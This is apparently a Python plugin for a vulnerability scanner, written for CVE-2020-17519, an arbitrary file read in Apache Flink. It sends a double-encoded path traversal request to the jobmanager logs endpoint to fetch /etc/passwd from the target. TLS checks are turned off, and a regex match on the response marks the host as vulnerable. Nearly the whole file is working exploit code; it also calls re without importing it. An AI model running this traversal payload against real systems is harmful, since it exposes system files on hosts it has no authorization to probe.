#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {
      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Filnk任意文件读取 cve-2020-17519',
      
      'level'     :   'medium',
      
      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

  }
  return ret
def run(url,ua):
  ret = msg()
  file_name = "/etc/passwd"
  file_name = file_name.replace("/","%252f")
  payload = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}".format(file_name)
  url1 = url + payload
  ret['url'] = url1
  headers = {'User-Agent': ua}
  try:
    res=requests.get(url=url1,headers=headers,verify=False,timeout=5)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret